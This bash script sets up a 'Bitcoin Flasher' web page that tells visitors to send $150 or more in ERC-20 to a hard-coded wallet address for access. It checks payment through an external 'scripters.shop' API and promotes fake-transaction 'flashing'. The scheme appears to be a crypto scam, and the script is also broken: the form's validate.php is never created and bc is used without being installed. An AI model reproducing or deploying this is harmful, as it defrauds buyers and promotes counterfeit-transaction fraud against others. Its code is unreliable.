#!/bin/bash

# Bitcoin Flasher Multi-Platform Setup
# Supports Ubuntu, Termux, and other terminals
# Automatically installs dependencies, verifies donations, and sets up a Bitcoin-themed PHP UI.

# Define colors
GREEN='\033[0;32m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m'

# Variables
API_URL="https://api.scripters.shop/v1/btc"
PHP_DIR="/var/www/html/bitcoin-flasher"
LOG_FILE="/var/log/bitcoin_flasher.log"

# Function: Check if running as root
check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo -e "${RED}[!] Please run as root (use sudo).${NC}"
        exit 1
    fi
}

# Function: Install dependencies
install_dependencies() {
    echo -e "${CYAN}[+] Installing dependencies...${NC}"
    
    if command -v apt >/dev/null; then
        sudo apt update -y
        sudo apt install -y apache2 php curl jq wget net-tools
    elif command -v pkg >/dev/null; then
        pkg update -y
        pkg install -y apache2 php curl jq wget
        termux-setup-storage
    else
        echo -e "${RED}[!] Unsupported package manager. Exiting.${NC}"
        exit 1
    fi

    echo -e "${GREEN}[✔] Dependencies installed successfully.${NC}"
}

# Function: Setup PHP and Apache
setup_php_server() {
    echo -e "${CYAN}[+] Configuring Apache and PHP...${NC}"

    mkdir -p "$PHP_DIR"
    cat >"$PHP_DIR/index.php" <<'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bitcoin Flasher</title>
    <style>
        body { background-color: #111; color: #fff; font-family: Arial, sans-serif; text-align: center; padding: 20px; }
        h1 { color: #FF9900; }
        button { background-color: #FF9900; color: #fff; padding: 10px 20px; border: none; cursor: pointer; }
        button:hover { background-color: #FF7700; }
    </style>
</head>
<body>
    <h1>Welcome to Bitcoin Flasher</h1>
    <p>Send $150+ in ERC-20 to <strong>0x3A06322e9F1124F6B2de8F343D4FDce4D1009869</strong> to gain access.</p>
    <p>Enter your transaction hash below:</p>
    <form action="validate.php" method="POST">
        <input type="text" name="tx_hash" placeholder="Transaction Hash" required>
        <button type="submit">Validate</button>
    </form>
</body>
</html>
EOF

    # Start or restart Apache
    if command -v apachectl >/dev/null; then
        apachectl restart
    else
        echo -e "${RED}[!] Apache not found. Make sure it is installed.${NC}"
    fi

    echo -e "${GREEN}[✔] PHP server configured successfully.${NC}"
}

# Function: Validate donations via Scripters API
validate_donations() {
    echo -e "${CYAN}[+] Validating donations...${NC}"
    read -p "Enter your transaction hash: " TX_HASH

    RESPONSE=$(curl -s "${API_URL}/erc20/donations?tx_hash=$TX_HASH")
    DONATION_AMOUNT=$(echo "$RESPONSE" | jq -r '.donationAmount')

    if (( $(echo "$DONATION_AMOUNT >= 150" | bc -l) )); then
        echo -e "${GREEN}[✔] Donation confirmed: $DONATION_AMOUNT USD.${NC}"
    else
        echo -e "${RED}[!] Donation insufficient. Please donate $150 or more.${NC}"
        exit 1
    fi
}

# Function: Display access link
display_access_url() {
    IP=$(hostname -I | awk '{print $1}')
    echo -e "${CYAN}[+] Access your Bitcoin Flasher at: ${GREEN}http://$IP/bitcoin-flasher${NC}"
}

# Main Execution
check_root
install_dependencies
setup_php_server
validate_donations
display_access_url
